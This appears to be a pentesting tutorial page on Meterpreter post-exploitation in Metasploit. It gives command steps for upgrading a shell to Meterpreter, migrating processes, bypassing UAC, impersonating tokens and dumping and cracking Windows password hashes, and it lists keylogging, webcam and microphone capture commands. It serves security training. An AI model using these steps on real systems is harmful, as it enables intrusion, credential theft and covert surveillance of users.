# Meterpreter post-exploitation

By now you probably has some kind of shell to the target. If it is not a meterpreter shell you should probably try to turn the current shell into a meterpreter shell, since it gives you a lot of tools available really easy.

So just create a meterpreter-shell from msfvenom or something like that. Maybe a php-shell. Or whatever you have access to. Then you just fire that script and get your meterpreter shell. Check out the chapter Exploiting/Msfvenom for more about creating payloads.

## Basics <a id="basics"></a>

List all commands

```text
help
```

Get help about a specific command

```text
help upload
```

### Sessions <a id="sessions"></a>

So first some basics. You can put the shell into a background job with the command`background`. This might be useful if you have several shells going at the same time. Or if you want to move to a specific directory to upload or download some files.

List background sessions

```text
background -l
```

Connect back to a background session

```text
background -i 1
```

Upload and download files.

```text
upload
download
```

#### **Privilege escalation** 

On Windows with the `getsystem` command. On modern Windows systems the User Account Control \(UAC\) prevents privilege escalation. You can bypass that restriction by using the `bypassuac` module \(**search uac**\), and then `set session <no>`and run with `exploit.`This opens a new sessions with UAC disabled so you now can use `getsystem`

**Migrate to another process**: `ps -U SYSTEM` -&gt; `migrate <pid>`

`use post/windows/gather/hashdump` or `hashdump` is a hashdump module for dumping a Windows password database. Then use `show options` to see the settings and lastly the command `exploit`

Dump the passwords from Metasploit and then crack them with John also from within Metasploit [https://www.offensive-security.com/metasploit-unleashed/john-ripper/](https://www.offensive-security.com/metasploit-unleashed/john-ripper/)

## Scripts <a id="scripts"></a>

### Migrate <a id="migrate"></a>

A really common and useful script that is build into metasploit is the migrate script. If you get the shell through some kind of exploits that crashes a program the user might shut down that program and it will close your session. So you need to migrate your session to another process. You can do that with the`migrate`script.

First run this command to output all processes

```text
ps
```

Now you choose one and run

```text
Migrate to another process: ps -U SYSTEM -> migrate <pid>
run migrate -p 1327
```

Where the`-p`is the PID of the process.

## Post modules <a id="post-modules"></a>

There are tons of modules specifically created for post-exploitation. They can be found with

```text
use post/
run post/windows/manage/migrate
```

### Upgrade a normal shell to meterpreter <a id="upgrade-a-normal-shell-to-metepreter"></a>

There is a point in doing stuff through metasploit. For example, if you find a exploit that does not have meterpreter available as a payload you can just start a normal shell and then upgrade it. To do that you do the following:

First you generate a shell through metasploit, either through a specici exploit or through a msfvenom-shell that you upload. Now that you have a normal shell it is time to upgrade it to a meterpreter shell.

First we have to leave the shell but without killing it. So we do

```text
Ctr-z
Background session 2? [y/N]  y
```

Now we have that shell running in the background, and you can see it with

```text
show sessions #or sessions -l
```

And you can connect to it again with

```text
sessions -i 1
```

Or whatever the number of the session is.

So now we have the shell running in the background. It is time to upgrade

```text
use post/multi/manage/shell_to_meterpreter
set LHOST 192.168.1.102
set session 1
exploit
```

Now metasploit will create a new session with meterpeter that will be available to you.

## **Privilege escalation**

**Getsystem**

The easiest way is to run the `getsystem` meterpreter command.

_**On Windows**_ with the `getsystem` command. On modern Windows systems the User Account Control \(UAC\) prevents privilege escalation. Check if UAC is enabled with the module `post/windows/gather/win/_privs` You can bypass that restriction by using the `bypassuac` module \(**search uac**\), and then`set session <no>`and run with `exploit.`This opens a new sessions with UAC disabled so you now can use `getsystem` to get the highest privileges.

`getprivs`

`run post/windows/gather/win_privs`

`getuid`

`incognito` module is used to migrate from one user to another. `list_token` _to see the available tokens and \`impersonate_`_`token\` to switch



#### Post Exploitation with Metasploit - \(available options depend on OS and Meterpreter Cababilities\)

\`download\` Download a file or directory

\`upload\` Upload a file or directory

\`portfwd\` Forward a local port to a remote service

\`route\` View and modify the routing table

\`keyscan\_start\` Start capturing keystrokes

\`keyscan\_stop\` Stop capturing keystrokes

\`screenshot\` Grab a screenshot of the interactive desktop

\`record\_mic\` Record audio from the default microphone for X seconds

\`webcam\_snap\` Take a snapshot from the specified webcam

\`getsystem\` Attempt to elevate your privilege to that of local system.

\`hashdump\` Dumps the contents of the SAM database

Meterpreter Post Exploitation Features

#### Create a Meterpreter background session

\`background\`



